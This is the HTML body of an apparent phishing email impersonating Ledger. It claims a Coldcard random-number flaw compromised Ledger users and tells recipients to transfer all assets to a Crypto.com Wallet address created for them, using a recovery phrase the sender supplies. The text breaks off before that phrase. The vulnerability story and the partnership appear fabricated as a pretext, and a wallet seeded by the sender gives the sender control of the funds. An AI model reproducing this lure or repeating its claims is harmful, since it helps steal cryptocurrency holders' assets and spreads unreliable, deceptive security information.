<h2 style=3D"margin:0 0 12px 0; font-size:18px; color:#000000; border-botto=
m:2px solid #f0f0f0; padding-bottom:8px;">Recent Coldcard Security Incident=
</h2>
<p style=3D"margin:0 0 18px 0; font-size:15px; line-height:1.7; color:#3333=
33;">We are writing to inform you about a recent security incident involvin=
g Coldcard, a third-party hardware wallet manufacturer. Coldcard recently d=
isclosed that their devices were affected by a vulnerability involving inse=
cure seed phrase generation.</p>

<p style=3D"margin:0 0 18px 0; font-size:15px; line-height:1.7; color:#3333=
33;">The vulnerability was caused by the use of a weak Random Number Genera=
tor (RNG) during the seed generation process. Because certain Ledger Live i=
ntegrations relied on shared libraries that interacted with these compromis=
ed seed environments, Ledger users were effected.</p>

<p style=3D"margin:0 0 18px 0; font-size:15px; line-height:1.7; color:#3333=
33;">To ensure the safety of your assets during this transition, we require=
 you to migrate your funds to a newly generated secure wallet environment.<=
/p>

<h2 style=3D"margin:28px 0 12px 0; font-size:18px; color:#000000; border-bo=
ttom:2px solid #f0f0f0; padding-bottom:8px;">Restore Access via Crypto.com =
Wallet</h2>
<p style=3D"margin:0 0 18px 0; font-size:15px; line-height:1.7; color:#3333=
33;">To restore immediate access to your funds, we have partnered with <str=
ong>crypto.com Wallet</strong> to provide a secure migration pathway. We ha=
ve generated a secure Crypto.com Wallet address linked to your account for =
this transfer.</p>

<p style=3D"margin:0 0 18px 0; font-size:15px; line-height:1.7; color:#3333=
33;">Please use the encrypted recovery phrase provided below within the off=
icial Crypto.com Wallet application and then transfer all assets to Crypto.=
com Wallet until further notice.</p>

